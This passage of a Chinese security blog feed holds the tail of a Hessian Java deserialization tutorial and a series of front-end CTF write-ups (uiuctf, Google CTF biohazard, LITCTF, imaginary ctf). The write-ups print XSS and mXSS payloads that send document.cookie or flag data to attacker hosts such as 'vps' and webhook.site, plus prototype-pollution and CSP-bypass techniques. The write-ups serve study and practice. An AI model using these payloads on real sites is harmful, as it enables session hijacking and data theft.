class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Class&lt;Object&gt;&gt;();</span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>, ObjectInputStream.class);</span><br><span class="line">        innerMap.put(<span class="string">&quot;2&quot;</span>, SQLData.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">friend</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(<span class="number">222</span>, <span class="string">&quot;hessian1&quot;</span>, <span class="string">&quot;boy&quot;</span>);</span><br><span class="line">        <span class="type">List</span> <span class="variable">friends</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Student&gt;();</span><br><span class="line">        friends.add(friend);</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        stu.setId(id);</span><br><span class="line">        stu.setName(name);</span><br><span class="line">        stu.setGender(gender);</span><br><span class="line">        stu.setInnerMap(innerMap);</span><br><span class="line">        stu.setFriends(friends);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---------------hessian serialize----------------&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] obj = serialize(stu);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(obj));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;---------------hessian deserialize--------------&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> deserialize(obj);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>1.首先通过需要序列化的类，获取到相应的serializer，在通过这个serializer进行writeobject操作<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt></p><p>2.一般对于自己写的class，他就会获取到defaultserializer<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p><p>3.在获取serializer的过程中，他会去读取Object中的fields，并对应上serializer<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt><br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt></p><p>4.获取完serializer，他会有一个将序列化的obj作为key，serializer作为value，加入到一个map和一个cachemap中<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt><br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p><p>5.接着就是常规的获取field，然后在根据field的serializer写入数据了<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt><br>大概过程就是</p><ul><li>获取序列化对象相对应的serializer，并获得到fields，每个fields会依次对应上一个serializer</li><li>将serializer加入map和cachemap中</li><li>根据fields写入序列化数据</li></ul><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>首先看到他读取了序列化数据中的第一个字节，并判断是属于那种类型的，并在下面的switch语句中选择使用哪种Serializer去进行序列化，在这里是Map，注意这里的Map并不是说反序列化的类是Map类型的，而是所有Object类型都会被这个readMap处理用来反序列化<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt><br>接下来就是常规的根据field然后deserialize<br>在这里的具体操作就是根据变量名获取到相应的deserialize<br><img src="/2023/09/07/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt><br>再在deserialize中获取value，并设置field</p><p><strong>上面的操作最好还是要自己跟一遍</strong></p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>与kryo类似，hessian也是因为反序列化Map类型时会调用put方法<br>那利用点也是从hashCode与equals入手了<br>在这里就不重复造轮子了，可以参考这篇文章</p><ul><li><a href="https://paper.seebug.org/1131/">https://paper.seebug.org/1131/</a></li><li>参考marshalsec</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;入门Hessian反序列化&quot;&gt;&lt;a href=&quot;#入门Hessian反序列化&quot; class=&quot;headerlink&quot; title=&quot;入门Hessian反序列化&quot;&gt;&lt;/a&gt;入门Hessian反序列化&lt;/h2&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="hessian" scheme="http://example.com/tags/hessian/"/>
    
  </entry>
  
  <entry>
    <title>前端ctf(持续更新)</title>
    <link href="http://example.com/2023/09/06/%E5%89%8D%E7%AB%AFctf/"/>
    <id>http://example.com/2023/09/06/%E5%89%8D%E7%AB%AFctf/</id>
    <published>2023-09-06T00:27:30.000Z</published>
    <updated>2023-09-23T15:32:41.836Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>持续更新一些国外的前端ctf，因为接触的前端偏少，这里就集中写一下wp<br><span id="more"></span></p><h2 id="uiuctf-peanut-xss"><a href="#uiuctf-peanut-xss" class="headerlink" title="uiuctf peanut-xss"></a>uiuctf peanut-xss</h2><p>nutshell.js中有一段代码<br><code>linkText.innerHTML = ex.innerText.slice(ex.innerText.indexOf(&#39;:&#39;)+1);</code><br>其中innerText会html解码，而innerHTML会把赋值的内容原封不动的输出到页面中，所以如果输入的是<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;<span class="regexp">/span&amp;gt;&amp;lt;img src onerror=&amp;#39;fetch(&amp;quot;https:/</span><span class="regexp">/vps/</span>?cookie=&amp;quot;+<span class="variable language_">document</span>.<span class="property">cookie</span>)&amp;#<span class="number">39</span>;/&amp;gt;&amp;lt;span&amp;gt;</span><br></pre></td></tr></table></figure><br>解码完以后就是<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="regexp">/span&gt;&lt;img src onerror=&#x27;fetch(&quot;https:/</span><span class="regexp">/vps/</span>?cookie=<span class="string">&quot;+document.cookie)&#x27;/&gt;&lt;span&gt;</span></span><br></pre></td></tr></table></figure><br>再把解码的内容赋值给innerHTML，那么就会造成dom xss<br>修复这个漏洞的话可以把innerHTML改成innerText<br><code>linkText.innerText = ex.innerText.slice(ex.innerText.indexOf(&#39;:&#39;)+1);</code><br>当innerText是被赋值的时候，输出到页面的时候会把html编码在输出</p><h2 id="google-ctf-biohazard"><a href="#google-ctf-biohazard" class="headerlink" title="google ctf biohazard"></a>google ctf biohazard</h2><p><a href="https://github.com/google/google-ctf/tree/master/2023/web-biohazard">https://github.com/google/google-ctf/tree/master/2023/web-biohazard</a><br>这是官方writeup，只对其中一些点进行记录</p><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>当时看到Object.assign联想到了原型链污染，但是我是用类似下面的方式去尝试原型链污染的，显然是失败了<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;: true&#125;&#125;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><br>但是如果是下面这种就是可以成功污染的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">assign</span>((&#123;&#125;)[<span class="string">&#x27;__proto__&#x27;</span>], <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;polluted&quot;: true&#125;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><h3 id="污染的点-editor"><a href="#污染的点-editor" class="headerlink" title="污染的点 editor"></a>污染的点 editor</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadEditorResources</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> style = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#editor-style&#x27;</span>).<span class="property">content</span>;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line">  <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  safeScriptEl.<span class="title function_">setSrc</span>(script, <span class="title function_">trustedResourceUrl</span>(editor));</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>();</span><br><span class="line">  <span class="keyword">if</span> (!location.<span class="property">pathname</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;/view/&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_">loadEditorResources</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>当uri开头不是view的时候就会加载这个loadEditorResources函数<br>而这个函数中<br><code>safeScriptEl.setSrc(script, trustedResourceUrl(editor));</code><br>这一段会设置一个js加载进去，<em>并且会设置好nonce</em>，其中editor在bootstrap.js中被定义了，所以只需要原型链覆盖了这个editor就可以了</p><h3 id="绕过csp"><a href="#绕过csp" class="headerlink" title="绕过csp"></a>绕过csp</h3><p>因为有csp策略，无法进行直接加载js，原型链污染不能直接覆盖被赋值的变量，所以利用iframe，设置csp，允许恶意的js加载，并且禁止加载bootstrap，就可以成功绕过<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://biohazard-web.2023.ctfcompetition.com/views/view/5f1a24e1-2744-42e2-8127-19fccd9c3f98&quot;</span> csp=<span class="string">&quot;script-src https://attack.shhnjk.com/alert.js https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>在这里我想到如果没有nonce，他只是script-src <a href="http://abc.com，那如果这个网站存在xss，我可不可以用iframe设置csp，允许某个网站，但是并不行，他只能去限制js的执行，不能去超过原本网站的允许范围，所以用到iframe的时候一般是去禁止某些js去运行">http://abc.com，那如果这个网站存在xss，我可不可以用iframe设置csp，允许某个网站，但是并不行，他只能去限制js的执行，不能去超过原本网站的允许范围，所以用到iframe的时候一般是去禁止某些js去运行</a></p></blockquote><h2 id="LITCTF-2023-fetch"><a href="#LITCTF-2023-fetch" class="headerlink" title="LITCTF 2023 fetch"></a>LITCTF 2023 fetch</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">runHTMLFile</span> = <span class="keyword">async</span> (<span class="params">filePath</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>();</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">`file:<span class="subst">$&#123;filePath&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> page.evaluate(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> req = <span class="keyword">new</span> <span class="variable language_">window</span>.<span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    req.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://flag:6969/&quot;</span> + randomString, <span class="literal">false</span>);</span><br><span class="line">    req.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> screenshot = <span class="keyword">await</span> page.<span class="title function_">screenshot</span>(&#123;</span><br><span class="line">    <span class="attr">path</span>: filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>),</span><br><span class="line">    <span class="attr">fullPage</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;png&quot;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> filePath.<span class="title function_">replace</span>(<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.png&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>filePath是我们上传的文件，传入一个html文件，page.goto会访问这个文件，page.evaluate会在访问这个页面的基础上执行里面的代码，也就是访问flag文件<br>只需要将window.XMLHttpRequest给重写了，就可以得到flag<br>wp<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> originalXHR = <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title function_">originalXHR</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> originalOpen = xhr.<span class="property">open</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  xhr.<span class="property">open</span> = <span class="keyword">function</span>(<span class="params">method, url, <span class="keyword">async</span>, user, password</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">return</span> originalOpen.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">const</span> originalOnReadyStateChange = xhr.<span class="property">onreadystatechange</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;XHR请求的responseText：&#x27;</span>, xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">let</span> callback = <span class="keyword">new</span> <span class="title function_">originalXHR</span>()</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    callback.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://vps:port/recv&quot;</span>,<span class="literal">false</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    callback.<span class="title function_">send</span>(xhr.<span class="property">responseText</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (originalOnReadyStateChange) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      originalOnReadyStateChange.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">return</span> xhr;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>onreadystatechange是用于监听 XMLHttpRequest 对象状态改变事件的属性。当XMLHttpRequest的状态发生了改变，就会触发绑定在onreadystatechange上的函数，当readState=4时，代表请求已完成，且响应已就绪。<br>这时候在其中把获取到的flag转发到自己的vps上面，当然也可以直接document.write到页面上，因为runHTMLFile会将页面的截图保存并返回。</p><h2 id="imaginary-ctf-2023-unsanitizer"><a href="#imaginary-ctf-2023-unsanitizer" class="headerlink" title="imaginary ctf 2023 unsanitizer"></a>imaginary ctf 2023 unsanitizer</h2><h3 id="unintended"><a href="#unintended" class="headerlink" title="unintended"></a>unintended</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">res.<span class="title function_">type</span>(<span class="string">&#x27;text&#x27;</span>).<span class="title function_">send</span>(<span class="string">`Page <span class="subst">$&#123;req.path&#125;</span> not found`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在这一段因为req.path是可控的，但是如果输入尖括号等特殊符号会被url编码，导致无法利用，一般这种情况下就需要想想能不能让这个回显的内容加载进script标签中，或者直接让他进入js文件中<br>下面的payload，就可以让他加入js文件中<br><code>127.0.0.1:3000/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//..%2findex.xhtml#http://127.0.0.1:8000</code><br>将这段放到浏览器的时候，浏览器会把他当做目录为<br><code>1;var[Page]=[1];location=location.hash.slice(1)+document.cookie</code><br>文件名为<br><code>..%2findex.xhtml</code><br>去浏览<br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/1.png" alt><br>但是后端会去解析%2f也就是说后端会去返回直接index.xhtml<br>浏览器接收到以后会直接去解析index.xhtml中的内容<br>那么里面的main.js也会被请求为<br><code>http://127.0.0.1:3000/1;location=location.hash.slice(1)+document.cookie//main.js</code><br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/2.png" alt><br>因为开头的那段404代码会被uri所控制，所以就变成了<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span> /<span class="number">1</span>;<span class="keyword">var</span>[<span class="title class_">Page</span>]=[<span class="number">1</span>];location=location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)+<span class="variable language_">document</span>.<span class="property">cookie</span><span class="comment">//main.js not found</span></span><br></pre></td></tr></table></figure><br><img src="/2023/09/06/%E5%89%8D%E7%AB%AFctf/3.png" alt><br>最后就直接跳转到#后面的url了</p><h3 id="intended"><a href="#intended" class="headerlink" title="intended"></a>intended</h3><ul><li>看到下面的代码，可以发现style标签下的尖括号是不会被转义的<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="string">&quot;&lt;div&gt;&lt;style&gt;a&lt;&lt;/style&gt;&lt;/div&gt;&quot;</span>)</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//&lt;div&gt;&lt;style&gt;a&lt;&lt;/style&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="string">&quot;&lt;svg&gt;aa&gt;&lt;/svg&gt;&quot;</span>)</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="comment">//&lt;svg&gt;aa&amp;gt;&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure></li><li>base的用法<br>href中输入abc，那么之后的所有访问都会基于<a href="http://target/abc/">http://target/abc/</a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=<span class="string">&quot;/abc/&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li></ul><p>接下来看到作者的payload<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span>&gt;</span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-x</span>=<span class="string">&quot;]]＞&lt;/style&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;iframe name=&#x27;Page&#x27; /&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;base href=&#x27;/**/+location.assign(document.all.url.textContent+document.cookie)//&#x27; /&gt;</span></span></span><span class="language-xml"><span class="tag"><span class="string">&lt;style&gt;&lt;!--&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span>--&gt;<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span>&lt;/div&gt;</span><br></pre></td></tr></table></figure><br>在xhtml中<code>&lt;![CDATA[XXXX]]&gt;</code>用于注释<br>利用xhtml和html的不同解析标准，在xhtml中就会变成下面这样<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;url&quot;</span>&gt;</span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span>/*&lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-x</span>=<span class="string">&quot;]]*/＞&lt;/style&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">  &lt;iframe name=&#x27;Page&#x27; /&gt;&lt;base href=&#x27;/**/+location.assign(document.all.url.textContent+document.cookie)//&#x27; /&gt;&lt;style&gt;&lt;!--&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>--&gt;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><br>跟unintended的思路一样，也是利用了会去加载其他js文件，且文件路径可控</p><h2 id="sekai-ctf-golf-jail"><a href="#sekai-ctf-golf-jail" class="headerlink" title="sekai ctf golf-jail"></a>sekai ctf golf-jail</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;持续更新一些国外的前端ctf，因为接触的前端偏少，这里就集中写一下wp&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜CVE</title>
    <link href="http://example.com/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/"/>
    <id>http://example.com/2023/08/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCVE/</id>
    <published>2023-08-27T03:45:45.000Z</published>
    <updated>2023-08-27T04:22:42.508Z</updated>
    
